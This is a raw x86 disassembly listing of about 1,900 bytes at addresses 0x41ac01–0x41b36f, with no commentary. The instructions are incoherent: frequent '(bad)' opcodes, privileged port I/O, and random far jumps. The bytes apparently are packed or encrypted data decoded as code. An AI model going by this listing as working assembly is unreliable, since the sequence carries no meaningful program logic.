  41ac01:	stos   DWORD PTR es:[edi],eax
  41ac02:	les    esp,FWORD PTR [ebp+0x5b7cf5ff]
  41ac08:	enter  0x7a47,0x52
  41ac0c:	cmp    DWORD PTR [ecx],esi
  41ac0e:	outs   dx,BYTE PTR ds:[esi]
  41ac0f:	sub    eax,0x48b3f795
  41ac14:	pop    ebp
  41ac15:	jae    0x41abea
  41ac17:	lahf   
  41ac18:	(bad)  
  41ac19:	je     0x41ac92
  41ac1b:	xor    al,dh
  41ac1d:	xor    al,0xad
  41ac1f:	mov    WORD PTR [esi-0x14302cfd],gs
  41ac25:	outs   dx,BYTE PTR ds:[esi]
  41ac26:	ret    
  41ac27:	arpl   WORD PTR [edx+0x19],bx
  41ac2a:	push   ss
  41ac2b:	xchg   BYTE PTR [ebx+0x1951d2c6],dh
  41ac31:	jb     0x41ac3c
  41ac33:	data16 fucomp st(3)
  41ac36:	sbb    eax,0xd717cdf2
  41ac3b:	jecxz  0x41aca4
  41ac3d:	jb     0x41ac3d
  41ac3f:	dec    esp
  41ac40:	sub    eax,DWORD PTR [ebx-0x2de936eb]
  41ac46:	adc    al,0xa3
  41ac48:	or     eax,0x3df07a3d
  41ac4d:	outs   dx,DWORD PTR ds:[esi]
  41ac4e:	(bad)  
  41ac50:	test   DWORD PTR [eax*1+0x42de90e2],ecx
  41ac57:	repz cwde 
  41ac59:	ins    BYTE PTR es:[edi],dx
  41ac5a:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41ac5c:	dec    edi
  41ac5d:	mov    esi,0x272e80ca
  41ac62:	sub    al,0x7c
  41ac64:	cmp    BYTE PTR [esp+edx*8-0x22],bh
  41ac68:	sbb    eax,0xf864950f
  41ac6d:	jae    0x41ac9e
  41ac6f:	xchg   ebx,eax
  41ac70:	jge    0x41ac35
  41ac72:	inc    ecx
  41ac73:	gs aam 0x5c
  41ac76:	icebp  
  41ac77:	sti    
  41ac78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac79:	push   ebp
  41ac7a:	fstp   TBYTE PTR [esi+ebx*2-0x6f]
  41ac7e:	loope  0x41ac14
  41ac80:	cmp    esi,ebp
  41ac82:	not    edi
  41ac84:	(bad)  
  41ac85:	rcr    BYTE PTR [ebp+0x3d9084d8],cl
  41ac8b:	dec    esi
  41ac8c:	xor    BYTE PTR [ebx-0x1e],0xa9
  41ac90:	and    ebp,edi
  41ac92:	add    ch,cl
  41ac94:	pop    ebx
  41ac95:	adc    al,0x92
  41ac97:	dec    ecx
  41ac98:	dec    esp
  41ac99:	pop    ebx
  41ac9a:	je     0x41ac45
  41ac9c:	xchg   edi,eax
  41ac9d:	loopne 0x41ac89
  41ac9f:	rol    DWORD PTR [ebx],0xa5
  41aca2:	jle    0x41ac49
  41aca4:	and    DWORD PTR [ecx],ecx
  41aca6:	or     al,0x9d
  41aca8:	push   edx
  41aca9:	out    0xa1,eax
  41acab:	push   ecx
  41acac:	(bad)  
  41acaf:	push   ss
  41acb0:	icebp  
  41acb1:	dec    eax
  41acb2:	xchg   edi,eax
  41acb3:	xor    al,0xa0
  41acb5:	push   ss
  41acb6:	adc    edx,ecx
  41acb8:	xchg   edx,eax
  41acb9:	push   0xea57c370
  41acbe:	pop    edx
  41acbf:	cwde   
  41acc0:	adc    DWORD PTR [edi-0x25613f13],ebx
  41acc6:	inc    ebp
  41acc7:	lds    ecx,FWORD PTR [edx+0x39]
  41acca:	inc    ebx
  41accb:	sbb    bl,bh
  41accd:	dec    ebp
  41acce:	sbb    esi,esp
  41acd0:	leave  
  41acd1:	repz push ds
  41acd3:	inc    edi
  41acd4:	daa    
  41acd5:	data16 fwait
  41acd7:	push   ds
  41acd8:	les    esi,FWORD PTR [ebp+0x6cf45f58]
  41acde:	dec    eax
  41acdf:	aam    0xe0
  41ace1:	shl    BYTE PTR [ebp+0x6b],cl
  41ace4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ace5:	mov    dl,0x4e
  41ace7:	sti    
  41ace8:	cmc    
  41ace9:	fcomp  DWORD PTR [ebp+0x406de616]
  41acef:	jmp    0x1da3:0xc07367eb
  41acf6:	in     al,dx
  41acf7:	mov    fs,WORD PTR [edi]
  41acf9:	ror    BYTE PTR [ebp+0x7a5728b6],1
  41acff:	(bad)  
  41ad00:	jae    0x41accf
  41ad02:	aad    0x96
  41ad04:	js     0x41ad61
  41ad06:	cs test al,0x48
  41ad09:	repz bound ebp,QWORD PTR gs:[ebp+0x31]
  41ad0e:	popa   
  41ad0f:	sbb    al,0xd9
  41ad11:	fstp   DWORD PTR [ebp-0x4eb0d3a7]
  41ad17:	xchg   BYTE PTR [eax+esi*4],dh
  41ad1a:	mov    ch,0xd4
  41ad1c:	adc    eax,0xc50a3c23
  41ad21:	es (bad) 
  41ad23:	push   0x2d
  41ad25:	cmp    DWORD PTR [esp+ebx*1],ecx
  41ad28:	imul   eax,ebp,0x173271e4
  41ad2e:	outs   dx,DWORD PTR ds:[esi]
  41ad2f:	and    BYTE PTR ds:0xd6effe44,0x54
  41ad36:	xchg   ebx,eax
  41ad37:	(bad)  
  41ad38:	fldenv [eax-0x44]
  41ad3b:	outs   dx,BYTE PTR ds:[esi]
  41ad3c:	pushf  
  41ad3d:	orps   xmm4,xmm0
  41ad40:	push   ebp
  41ad41:	fninit 
  41ad43:	inc    ebx
  41ad44:	adc    BYTE PTR [edx],dh
  41ad46:	or     eax,0x8f96aba1
  41ad4b:	cmp    DWORD PTR [ebx],ecx
  41ad4d:	dec    esp
  41ad4e:	cwde   
  41ad4f:	jmp    0x6780:0x60997c4
  41ad56:	icebp  
  41ad57:	push   edi
  41ad58:	dec    ecx
  41ad59:	fs std 
  41ad5b:	and    ch,ch
  41ad5d:	cmp    eax,0x76aaf25c
  41ad62:	add    eax,0x514240c6
  41ad67:	jmp    0xd54a3e9e
  41ad6c:	and    cl,cl
  41ad6e:	and    BYTE PTR [ebp-0xe9d938e],dh
  41ad74:	dec    edx
  41ad75:	jns    0x41ad56
  41ad77:	pop    edx
  41ad78:	sub    DWORD PTR [edi+edx*8],0x5f
  41ad7c:	jb     0x41ad03
  41ad7e:	das    
  41ad7f:	jb     0x41adee
  41ad81:	hlt    
  41ad82:	icebp  
  41ad83:	add    BYTE PTR [ebp-0x72],ch
  41ad86:	mov    ecx,DWORD PTR [ecx+0x1a]
  41ad89:	pop    es
  41ad8a:	mov    ebp,0xb6ec2c5c
  41ad8f:	pusha  
  41ad90:	mov    ecx,0x54c402ce
  41ad95:	sbb    BYTE PTR [edx+esi*4-0x26],dl
  41ad99:	nop    edx
  41ad9c:	test   eax,0xf0704ea3
  41ada1:	es inc esp
  41ada3:	popf   
  41ada4:	or     bh,BYTE PTR [edi+0x5e2ba809]
  41adaa:	test   eax,0xf769af05
  41adaf:	and    BYTE PTR [esi],bl
  41adb1:	imul   edx,DWORD PTR [ebx],0x5c
  41adb4:	out    0x84,al
  41adb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adb7:	or     DWORD PTR [edx],ecx
  41adb9:	imul   ebx,esi,0xe4006167
  41adbf:	lahf   
  41adc0:	and    DWORD PTR [ebx+edx*1+0x175e4dba],ebp
  41adc7:	cmp    BYTE PTR [edx+0x6cb3b04c],al
  41adcd:	xchg   edi,eax
  41adce:	xchg   edx,eax
  41adcf:	cmp    dl,ah
  41add1:	or     dl,bh
  41add3:	(bad)
  41add6:	sbb    ecx,DWORD PTR [eax-0x22bf4b7d]
  41addc:	fdivr  st,st(6)
  41adde:	stos   DWORD PTR es:[edi],eax
  41addf:	xchg   ecx,eax
  41ade0:	mov    ecx,0x642e6412
  41ade5:	sbb    ebx,DWORD PTR [ecx]
  41ade7:	mov    eax,ds:0xb14de934
  41adec:	ins    BYTE PTR es:[edi],dx
  41aded:	(bad)  
  41adee:	push   ebp
  41adef:	aaa    
  41adf0:	mov    DWORD PTR [ebp-0x1f],ebx
  41adf3:	call   0x145a:0x58993c33
  41adfa:	push   esi
  41adfb:	(bad)  
  41adfc:	js     0x41ae03
  41adfe:	cmp    BYTE PTR [eax+0x6f9f910e],0x6e
  41ae05:	test   DWORD PTR [eax+0x2c],esp
  41ae08:	arpl   WORD PTR [ecx-0x1f],si
  41ae0b:	mul    cl
  41ae0d:	push   ds
  41ae0e:	fimul  WORD PTR [edx+0x6b]
  41ae11:	adc    ecx,DWORD PTR [eax+0x59]
  41ae14:	(bad)  
  41ae15:	jbe    0x41ae07
  41ae17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae18:	push   es
  41ae19:	mov    WORD PTR [edx-0x31],ds
  41ae1c:	ja     0x41ae0b
  41ae1e:	pusha  
  41ae1f:	mov    esi,ebp
  41ae21:	push   ss
  41ae22:	daa    
  41ae23:	sbb    DWORD PTR [ebp+0x12],0x1d
  41ae27:	add    bh,BYTE PTR [ebx+0x45]
  41ae2a:	(bad)  
  41ae2b:	fsub   st(0),st
  41ae2d:	mov    eax,0x2f551054
  41ae32:	sbb    eax,0x10a3d0b6
  41ae37:	ror    DWORD PTR [esi+0x3ae641af],1
  41ae3d:	xor    eax,0xa6835356
  41ae42:	mov    ebx,esp
  41ae44:	lods   eax,DWORD PTR ds:[esi]
  41ae45:	push   cs
  41ae46:	pop    esp
  41ae47:	sub    eax,0xfc740b69
  41ae4c:	fnclex 
  41ae4e:	mov    ds:0x5b610377,eax
  41ae53:	or     BYTE PTR [ecx+0x68],dh
  41ae56:	std    
  41ae57:	add    DWORD PTR [ebp-0x1a],edx
  41ae5a:	sbb    al,BYTE PTR [ebp-0x18]
  41ae5d:	jae    0x41ade7
  41ae5f:	xchg   ebp,eax
  41ae60:	mov    ch,0x14
  41ae62:	int    0x45
  41ae64:	imul   ebp,esp,0xffffffc8
  41ae67:	repz fiadd WORD PTR [ecx+0x7f]
  41ae6b:	xor    BYTE PTR [ebx-0x35e8dea5],bh
  41ae71:	cmp    al,0x2c
  41ae73:	or     edi,esp
  41ae75:	pop    esp
  41ae76:	mov    esi,0xd20063b0
  41ae7b:	repz mov eax,0xcdf9f1a0
  41ae81:	mov    ds:0x930e5e8f,al
  41ae86:	push   ss
  41ae87:	inc    eax
  41ae88:	popf   
  41ae89:	(bad)  
  41ae8a:	loopne 0x41aed9
  41ae8c:	xor    al,0xd4
  41ae8e:	in     al,0xd6
  41ae90:	push   0x37
  41ae92:	jb     0x41aef7
  41ae94:	cmp    dh,bh
  41ae96:	mov    eax,ebx
  41ae98:	aaa    
  41ae99:	xor    BYTE PTR [ebx-0x7bcbe2cb],bl
  41ae9f:	xchg   ecx,eax
  41aea0:	xchg   DWORD PTR [eax],esi
  41aea2:	xchg   edi,eax
  41aea3:	dec    ecx
  41aea4:	inc    eax
  41aea5:	xor    eax,0x629e43c7
  41aeaa:	cmp    dh,BYTE PTR [ebp+0x17]
  41aead:	xchg   BYTE PTR [esi-0x59],bh
  41aeb0:	in     al,0x55
  41aeb2:	pop    esp
  41aeb3:	lds    eax,FWORD PTR [ecx-0x1d]
  41aeb6:	fimul  DWORD PTR ds:0xa4f7a559
  41aebc:	(bad)  
  41aebd:	lock jne 0x41ae6d
  41aec0:	int3   
  41aec1:	sti    
  41aec2:	dec    eax
  41aec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aec4:	and    BYTE PTR [ecx-0x54ca85bf],dh
  41aeca:	sub    eax,0xcf34f3fb
  41aecf:	dec    esi
  41aed0:	mov    eax,0x44bd5ee3
  41aed5:	xlat   BYTE PTR ds:[ebx]
  41aed6:	pop    eax
  41aed7:	adc    dl,dl
  41aed9:	je     0x41af37
  41aedb:	out    0x42,eax
  41aedd:	mov    dh,0xd7
  41aedf:	icebp  
  41aee0:	xlat   BYTE PTR ds:[ebx]
  41aee1:	add    al,0xd3
  41aee3:	pop    esi
  41aee4:	(bad)  
  41aee5:	call   0x148b8ff7
  41aeea:	ins    DWORD PTR es:[edi],dx
  41aeeb:	pop    edx
  41aeec:	fimul  WORD PTR [ecx]
  41aeee:	loope  0x41af23
  41aef0:	out    0x45,al
  41aef2:	inc    ebx
  41aef3:	rol    bl,cl
  41aef5:	xlat   BYTE PTR ds:[ebx]
  41aef6:	das    
  41aef7:	es retf 0x2c12
  41aefb:	xchg   esi,eax
  41aefc:	xor    ah,BYTE PTR [edi+0x7c]
  41aeff:	add    DWORD PTR [ebx-0x65],0xffffffa3
  41af03:	pop    ebp
  41af04:	mov    eax,ds:0xbb584989
  41af09:	sbb    al,0x52
  41af0b:	lahf   
  41af0c:	loopne 0x41ae8f
  41af0e:	xor    ebp,DWORD PTR [eax+ecx*1+0x48]
  41af12:	inc    edi
  41af13:	leave  
  41af14:	adc    DWORD PTR [edi],esi
  41af16:	cmp    dl,BYTE PTR [esi]
  41af18:	cmp    bl,bh
  41af1a:	pop    ecx
  41af1b:	ds pop ebx
  41af1d:	out    0x41,eax
  41af1f:	ins    BYTE PTR es:[edi],dx
  41af20:	fadd   QWORD PTR [ecx+eax*4+0x58]
  41af24:	xor    ebp,DWORD PTR [eax-0x210e0963]
  41af2a:	fdiv   QWORD PTR [edx-0x1b1760d3]
  41af30:	aaa    
  41af31:	add    BYTE PTR [edi+0x721a22bf],dl
  41af37:	or     eax,0x41b07119
  41af3c:	fcomp  QWORD PTR [ecx+ebx*1-0xe1d2926]
  41af43:	or     al,0xfe
  41af45:	mov    BYTE PTR [ecx+0x2b],dl
  41af48:	mov    cl,0x23
  41af4a:	imul   DWORD PTR [edx]
  41af4c:	shl    BYTE PTR [edi],1
  41af4e:	fdivr  st,st(7)
  41af50:	loope  0x41af32
  41af52:	jl     0x41af6b
  41af54:	pushf  
  41af55:	fsub   st(4),st
  41af57:	xchg   ebx,eax
  41af58:	(bad)  
  41af59:	stc    
  41af5a:	mov    BYTE PTR [edi],bl
  41af5c:	push   0xffffff8e
  41af5e:	push   eax
  41af5f:	xchg   ebx,eax
  41af60:	add    eax,0x770f83a7
  41af65:	pop    esi
  41af66:	lea    eax,[ecx+eiz*4+0x17]
  41af6a:	xchg   esi,eax
  41af6b:	mov    ebp,0x33717596
  41af70:	aas    
  41af71:	add    cl,BYTE PTR [esi]
  41af73:	shl    DWORD PTR [ebx+0x565a51e2],0xfd
  41af7a:	(bad)  
  41af7b:	std    
  41af7c:	sbb    ah,BYTE PTR [ecx]
  41af7e:	inc    eax
  41af7f:	hlt    
  41af80:	sub    ecx,DWORD PTR [edx]
  41af82:	out    0x10,eax
  41af84:	cmp    al,0x86
  41af86:	mov    ecx,0xead79906
  41af8b:	mov    ebx,0xda4dcacc
  41af90:	jle    0x41af83
  41af92:	test   eax,0xd27eec27
  41af97:	or     DWORD PTR [edi+0x76],edi
  41af9a:	inc    ebp
  41af9b:	add    BYTE PTR [ecx+0x25],ah
  41af9e:	clc    
  41af9f:	mov    edi,0xd2158ba
  41afa4:	and    ax,0x92b5
  41afa8:	mov    ds:0xda4030d9,al
  41afad:	in     al,0xf3
  41afaf:	icebp  
  41afb0:	aam    0x74
  41afb2:	or     BYTE PTR [edx+0x37],0x44
  41afb6:	out    0x1a,al
  41afb8:	ins    BYTE PTR es:[edi],dx
  41afb9:	and    eax,DWORD PTR [ebx]
  41afbb:	lahf   
  41afbc:	call   0x95b:0x9db60c44
  41afc3:	push   ebp
  41afc4:	push   cs
  41afc5:	ins    BYTE PTR es:[edi],dx
  41afc6:	retf   0xe109
  41afc9:	in     al,dx
  41afca:	iret   
  41afcb:	iret   
  41afcc:	mov    dl,0xac
  41afce:	add    al,BYTE PTR [ebp+0x66]
  41afd1:	sahf   
  41afd2:	pop    ecx
  41afd3:	shl    DWORD PTR [edx-0x7a81fa9f],cl
  41afd9:	fild   WORD PTR ds:0x98cc24c2
  41afdf:	ds enter 0xa433,0xf7
  41afe4:	into   
  41afe5:	inc    ecx
  41afe6:	and    ecx,DWORD PTR [ebx+0x7b]
  41afe9:	jmp    0xad5c:0x20aa39d1
  41aff0:	clc    
  41aff1:	ficomp DWORD PTR [ebp-0x15c9d86a]
  41aff7:	sbb    DWORD PTR [ebp+0x66],0xa8a5d5d5
  41affe:	lahf   
  41afff:	mov    edx,0x8b466f70
  41b004:	loop   0x41b02f
  41b006:	addr16 adc eax,0x843581b8
  41b00c:	dec    ecx
  41b00d:	sub    BYTE PTR [esi-0x16942f65],ch
  41b013:	inc    esp
  41b014:	sbb    esi,esi
  41b016:	ins    DWORD PTR es:[edi],dx
  41b017:	out    0x9e,eax
  41b019:	jae    0x41b066
  41b01b:	or     esi,esp
  41b01d:	push   eax
  41b01e:	in     al,0x2c
  41b020:	fldcw  WORD PTR [ecx-0x5d84d99b]
  41b026:	outs   dx,BYTE PTR ds:[esi]
  41b027:	jmp    0x41b031
  41b029:	xchg   ebp,eax
  41b02a:	outs   dx,DWORD PTR ds:[esi]
  41b02b:	in     eax,dx
  41b02c:	popf   
  41b02d:	xchg   ecx,eax
  41b02e:	pop    edi
  41b02f:	mov    bl,al
  41b031:	dec    ecx
  41b032:	jle    0x41b00f
  41b034:	es or  eax,0xe6111dcf
  41b03a:	pop    es
  41b03b:	mov    cs,WORD PTR [edi-0x53]
  41b03e:	aas    
  41b03f:	not    DWORD PTR [edx+0x15ac8d38]
  41b045:	mov    eax,ds:0x9f6c3f76
  41b04a:	imul   edx,DWORD PTR [eax],0xa5cd05c3
  41b050:	xor    dl,BYTE PTR [ebp-0x60ea2e26]
  41b056:	rol    DWORD PTR [ecx+eiz*8+0x544275e6],1
  41b05d:	push   ebp
  41b05e:	mov    ecx,0x52312f68
  41b063:	(bad)  
  41b064:	mov    ecx,0xa32730b2
  41b069:	lods   al,BYTE PTR ds:[esi]
  41b06a:	js     0x41b0e0
  41b06c:	xchg   esp,eax
  41b06d:	pop    ebp
  41b06e:	test   DWORD PTR [eax-0x2f6ab6b6],ebx
  41b074:	and    ebx,ebx
  41b076:	sbb    eax,0x4e22ef42
  41b07b:	jmp    DWORD PTR [ebx]
  41b07d:	mov    ebp,0x1c9a62d2
  41b082:	push   ds
  41b083:	jns    0x41b0bc
  41b085:	fcom   DWORD PTR [esi]
  41b087:	test   eax,0x1f0fd05c
  41b08c:	cdq    
  41b08d:	jp     0x41b0ca
  41b08f:	jo     0x41b06d
  41b091:	repz or BYTE PTR [ebp+0x3],cl
  41b095:	aas    
  41b096:	enter  0x4def,0x1f
  41b09a:	in     eax,dx
  41b09b:	fld    DWORD PTR [ecx-0x5f]
  41b09e:	jge    0x41b10f
  41b0a0:	lds    esp,FWORD PTR [edx-0x19301171]
  41b0a6:	loope  0x41b02d
  41b0a8:	adc    eax,0x9b56013d
  41b0ad:	adc    BYTE PTR [esi+0x54ba7540],bl
  41b0b3:	mov    bl,0x5
  41b0b5:	and    edi,DWORD PTR [edx]
  41b0b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0b8:	adc    bh,BYTE PTR [edx-0x62]
  41b0bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0bc:	mov    dl,0x94
  41b0be:	jne    0x41b0d3
  41b0c0:	mov    DWORD PTR [eax],edx
  41b0c2:	cs dec eax
  41b0c4:	sub    dh,BYTE PTR ds:0x3c830d2
  41b0ca:	cmc    
  41b0cb:	jmp    DWORD PTR [edx+0x7ade9cf1]
  41b0d1:	push   ss
  41b0d2:	mov    cl,0x88
  41b0d4:	sbb    ah,BYTE PTR [edx+0x6e]
  41b0d7:	inc    ecx
  41b0d8:	je     0x41b0a2
  41b0da:	loopne 0x41b0fe
  41b0dc:	dec    ecx
  41b0dd:	or     esi,ebp
  41b0df:	inc    eax
  41b0e0:	mov    BYTE PTR [ecx],0x4e
  41b0e3:	lods   al,BYTE PTR ds:[esi]
  41b0e4:	dec    ebx
  41b0e5:	inc    esi
  41b0e6:	xchg   esp,eax
  41b0e7:	ins    BYTE PTR es:[edi],dx
  41b0e8:	cmp    eax,0x605c1236
  41b0ed:	xor    eax,0x7fb812a7
  41b0f2:	loop   0x41b12c
  41b0f4:	xchg   ecx,eax
  41b0f5:	adc    al,0x15
  41b0f7:	or     DWORD PTR [edi],0x29
  41b0fa:	inc    eax
  41b0fb:	daa    
  41b0fc:	sar    eax,0xe2
  41b0ff:	or     ebx,DWORD PTR [esi+ebx*8-0x2be27437]
  41b106:	sahf   
  41b107:	sbb    eax,0x9040b7f1
  41b10c:	push   ss
  41b10d:	xchg   ebp,eax
  41b10e:	retf   
  41b10f:	push   0xfffffffc
  41b111:	arpl   WORD PTR [ecx],ax
  41b113:	mov    bh,0xe5
  41b115:	cs ret 
  41b117:	je     0x41b161
  41b119:	pop    edi
  41b11a:	jge    0x41b0a9
  41b11c:	mov    ecx,0x265f9a0
  41b121:	repz mov dh,0x18
  41b124:	arpl   WORD PTR [ebx-0x55],si
  41b127:	push   0xc97b2349
  41b12c:	into   
  41b12d:	and    eax,0x4bcc3f55
  41b132:	dec    ebp
  41b133:	push   eax
  41b134:	(bad)  
  41b135:	adc    DWORD PTR [ecx-0x19f63ec1],esi
  41b13b:	add    BYTE PTR [edi],ah
  41b13d:	cs enter 0x2e6,0xe5
  41b142:	xlat   BYTE PTR ds:[ebx]
  41b143:	les    ecx,FWORD PTR [ecx]
  41b145:	or     ecx,DWORD PTR [ecx+0x6499eca3]
  41b14b:	xchg   DWORD PTR [edi+0x26],eax
  41b14e:	inc    edi
  41b14f:	inc    ebp
  41b150:	push   eax
  41b151:	ds push esi
  41b153:	sub    DWORD PTR cs:[eax],esi
  41b156:	fst    DWORD PTR [edx+0x57]
  41b159:	mov    WORD PTR [esi+0x69d18767],?
  41b15f:	add    esi,DWORD PTR [eax+eax*8-0x2b87991b]
  41b166:	outs   dx,DWORD PTR ds:[esi]
  41b167:	sbb    dh,dh
  41b169:	cs ss std 
  41b16c:	xlat   BYTE PTR ds:[ebx]
  41b16d:	mov    al,ds:0xc75f8af3
  41b172:	xor    al,0xc2
  41b174:	cwde   
  41b175:	(bad)  
  41b176:	bound  ecx,QWORD PTR [ebp-0x1a09e0db]
  41b17c:	push   ss
  41b17d:	jae    0x41b164
  41b17f:	(bad)  
  41b180:	sahf   
  41b181:	call   0x7957:0x62c3f143
  41b188:	dec    ebp
  41b189:	aas    
  41b18a:	mov    ds,WORD PTR [eax+ebp*1+0x4e755607]
  41b191:	shr    eax,0x71
  41b194:	ss (bad) 
  41b197:	jo     0x41b214
  41b199:	sub    eax,0x735f103b
  41b19e:	lods   eax,DWORD PTR ds:[esi]
  41b19f:	or     eax,0xfee79e1
  41b1a4:	lods   eax,DWORD PTR ds:[esi]
  41b1a5:	adc    ah,cl
  41b1a7:	sbb    DWORD PTR [eax],esi
  41b1a9:	ret    0x803e
  41b1ac:	or     BYTE PTR [ebx+0x291b41a2],al
  41b1b2:	mov    bh,0xbe
  41b1b4:	loop   0x41b156
  41b1b6:	push   ss
  41b1b7:	mov    bh,0x4f
  41b1b9:	mov    ebx,0x66104178
  41b1be:	jae    0x41b1e5
  41b1c0:	push   0xffffffbc
  41b1c2:	sbb    DWORD PTR [ebx-0x1deaec6f],ecx
  41b1c8:	mov    ebx,0x2224c4a3
  41b1cd:	loopne 0x41b218
  41b1cf:	repz out dx,eax
  41b1d1:	out    dx,eax
  41b1d2:	int3   
  41b1d3:	arpl   WORD PTR [esi-0x19],sp
  41b1d6:	mov    WORD PTR [ebp+0x4c],ss
  41b1d9:	jle    0x41b1ed
  41b1db:	jle    0x41b1c7
  41b1dd:	xchg   ecx,eax
  41b1de:	cmp    ebp,edx
  41b1e0:	xchg   esp,eax
  41b1e1:	ja     0x41b186
  41b1e3:	mov    edx,0xc77bd78a
  41b1e8:	ret    
  41b1e9:	retf   0x3bb2
  41b1ec:	inc    edx
  41b1ed:	push   es
  41b1ee:	cmp    DWORD PTR [edi+0xdde01d6],esi
  41b1f4:	adc    dh,BYTE PTR [edi+0x25]
  41b1f7:	and    eax,0xc9021b3a
  41b1fc:	repnz inc ecx
  41b1fe:	or     al,0x6
  41b200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b201:	mov    bh,0x96
  41b203:	addr16 pop eax
  41b205:	sbb    eax,0x9e4daaee
  41b20a:	push   esp
  41b20b:	fiadd  DWORD PTR [esp+eax*1]
  41b20e:	lea    edx,[eax+0x51]
  41b211:	mov    bh,0x54
  41b213:	lods   al,BYTE PTR ds:[esi]
  41b214:	hlt    
  41b215:	sbb    bh,dl
  41b217:	mov    ds:0xd2327a3f,eax
  41b21c:	call   0x4d548d41
  41b221:	xor    eax,0x210d978d
  41b226:	sub    eax,DWORD PTR [ecx]
  41b228:	add    bh,BYTE PTR [edi+0x4f]
  41b22b:	pusha  
  41b22c:	sbb    dl,dl
  41b22e:	mov    ss,ebp
  41b230:	(bad)  
  41b231:	ficomp DWORD PTR [ecx+0x34]
  41b234:	sub    cl,dh
  41b236:	ror    edi,cl
  41b238:	mov    dl,dl
  41b23a:	mov    esi,0x688d60bc
  41b23f:	fisub  DWORD PTR [esi+0x6213daf7]
  41b245:	retf   0xd3e3
  41b248:	add    DWORD PTR [eax+0x58c158f1],edi
  41b24e:	nop
  41b24f:	mov    al,ds:0x69269cf7
  41b254:	cmp    bl,BYTE PTR [edx+0x6a]
  41b257:	aas    
  41b258:	xor    al,0x44
  41b25a:	das    
  41b25b:	inc    esi
  41b25c:	add    al,0xfd
  41b25e:	jns    0x41b2dd
  41b260:	jp     0x41b281
  41b262:	pushaw 
  41b264:	imul   esi,ebx,0x15d5d414
  41b26a:	xchg   esp,eax
  41b26b:	mov    ds:0x22e1b1d1,al
  41b270:	fsub   st(1),st
  41b272:	and    di,WORD PTR [edx+ebp*4]
  41b276:	ficomp DWORD PTR [eax]
  41b278:	jmp    0x3578301f
  41b27d:	pusha  
  41b27e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b27f:	icebp  
  41b280:	rol    BYTE PTR [edx+0x69736b63],cl
  41b286:	daa    
  41b287:	push   es
  41b288:	push   ss
  41b289:	cwde   
  41b28a:	add    DWORD PTR [ecx+0x75722303],eax
  41b290:	adc    BYTE PTR [ebp+0x77],ch
  41b293:	mov    bl,0xf8
  41b295:	aaa    
  41b296:	adc    dh,BYTE PTR [esi-0x7]
  41b299:	(bad)  
  41b29a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b29b:	mov    ebx,0x9c30ee5c
  41b2a0:	test   bl,ch
  41b2a2:	test   esp,esi
  41b2a4:	xchg   bl,dh
  41b2a6:	inc    esp
  41b2a7:	or     al,ah
  41b2a9:	jl     0x41b2c2
  41b2ab:	or     edi,DWORD PTR [esp+ebx*2-0x58bc77fb]
  41b2b2:	xor    DWORD PTR [ebp-0x739c07b1],esp
  41b2b8:	cmp    al,0x94
  41b2ba:	xor    al,0xcf
  41b2bc:	loop   0x41b2f6
  41b2be:	inc    ecx
  41b2bf:	xor    BYTE PTR [ebp+0x41],bh
  41b2c2:	cmp    al,0x2d
  41b2c4:	xor    ebp,DWORD PTR [ebp-0x526968f6]
  41b2ca:	ja     0x41b324
  41b2cc:	test   al,0xb8
  41b2ce:	mov    cl,0xd1
  41b2d0:	sti    
  41b2d1:	xchg   ecx,eax
  41b2d2:	jecxz  0x41b304
  41b2d4:	sbb    cl,BYTE PTR [ecx+0xe8a65d7]
  41b2da:	je     0x41b2d7
  41b2dc:	mov    ebx,0x5cbc90c9
  41b2e1:	mov    ebx,esi
  41b2e3:	lods   eax,DWORD PTR ds:[esi]
  41b2e4:	jmp    0xda3a3a53
  41b2e9:	repz or bl,BYTE PTR [esi+0x4d]
  41b2ed:	ins    DWORD PTR es:[edi],dx
  41b2ee:	lock inc esi
  41b2f0:	mov    ebp,0x59330720
  41b2f5:	jno    0x41b294
  41b2f7:	jns    0x41b32a
  41b2f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2fa:	add    eax,0x83e857eb
  41b2ff:	mov    edi,0x2219411c
  41b304:	stos   DWORD PTR es:[edi],eax
  41b305:	add    al,0x78
  41b307:	data16 jne 0x41b34f
  41b30a:	inc    esp
  41b30b:	jle    0x41b2ec
  41b30d:	out    0xea,eax
  41b30f:	mul    BYTE PTR [ebx+edi*1-0x36]
  41b313:	popa   
  41b314:	ror    DWORD PTR [edx-0x35],0x4b
  41b318:	fcmove st,st(6)
  41b31a:	mov    edi,0xe02a178e
  41b31f:	iret   
  41b320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b321:	ss sbb esp,ecx
  41b324:	aas    
  41b325:	and    ah,BYTE PTR [ecx]
  41b327:	cmp    BYTE PTR [ecx],dl
  41b329:	jge    0x41b2c0
  41b32b:	outs   dx,DWORD PTR ds:[esi]
  41b32c:	mov    DWORD PTR ds:0xcabd0e18,edi
  41b332:	dec    ecx
  41b333:	(bad)  
  41b334:	xchg   esi,eax
  41b335:	and    DWORD PTR [ebp+0x4e],edx
  41b338:	adc    al,0xa6
  41b33a:	sub    eax,0x416f1e05
  41b33f:	xchg   edi,eax
  41b340:	add    al,0xa2
  41b342:	push   esi
  41b343:	test   eax,0x968fdc56
  41b348:	loopne 0x41b3ac
  41b34a:	cwde   
  41b34b:	or     al,0x79
  41b34d:	push   ebp
  41b34e:	mov    bl,0x5b
  41b350:	ror    BYTE PTR [ebx],0xa
  41b353:	lock jnp 0x41b39c
  41b356:	scas   al,BYTE PTR es:[edi]
  41b357:	jmp    0x41b2fd
  41b359:	mov    edx,eax
  41b35b:	out    0xd,al
  41b35d:	mov    al,ds:0xfaad26eb
  41b362:	lock add DWORD PTR [ecx-0x8],esp
  41b366:	lea    ecx,[eax+0x43]
  41b369:	cmc    
  41b36a:	data16 cmc 
  41b36c:	inc    ebp
  41b36d:	sti    
  41b36e:	inc    ecx
  41b36f:	jbe    0x41b3d1
